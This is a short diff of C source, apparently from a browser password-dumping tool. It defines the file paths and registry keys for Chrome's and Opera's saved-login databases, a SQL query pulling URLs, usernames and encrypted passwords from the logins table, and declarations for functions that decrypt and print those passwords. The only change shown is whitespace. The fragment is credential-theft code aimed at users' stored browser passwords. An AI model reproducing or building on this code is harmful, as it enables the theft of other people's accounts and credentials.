@@ -10,7 +10,7 @@
 # define C_REGKEY L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
 # define O_DBFILE "\\Opera Software\\Opera Stable\\Login Data" 
 # define O_REGKEY L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\opera.exe"
-# define QUERY "SELECT origin_url, username_value, length(password_value), password_value FROM logins"
+# define QUERY    "SELECT origin_url, username_value, length(password_value), password_value FROM logins"
 
 const char  *uncryptData(BYTE *password, int size);
 void        printPassword(sqlite3_stmt *stmt);
